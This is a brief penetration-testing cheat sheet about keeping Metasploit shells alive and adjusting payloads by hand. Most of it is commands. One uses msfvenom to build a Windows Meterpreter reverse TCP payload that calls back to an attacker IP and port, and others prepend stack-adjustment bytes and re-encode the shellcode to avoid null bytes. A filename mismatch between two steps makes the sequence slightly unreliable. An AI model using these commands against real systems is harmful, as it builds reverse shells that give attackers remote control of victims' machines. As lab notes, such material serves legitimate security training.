# Shell Debugging

## Use MSF Handler to Prevent Dying Shells:

Use `set AUTORUNSCRIPT post/windows/manage/migrate` with `exploit/multi/handler`.

## Adjust Payload manually

This is normally done using the `StackAdjustment` parameter in Metasploit exploits. But you can do it manually to be independent of MSF exploits:

```
# msfvenom -p windows/meterpreter/reverse_nonx_tcp LHOST=10.11.0.134 LPORT=4444 -f raw -o exploit_payload
# echo -en "\x81\xec\xac\x0d\x00\x00" > stack_adjustment
# cat stack_adjustment exploit_payload > adjusted_shellcode
# cat adjusted_payload | msfvenom -p - -b "\x00" -a x86 --platform Windows -f python
```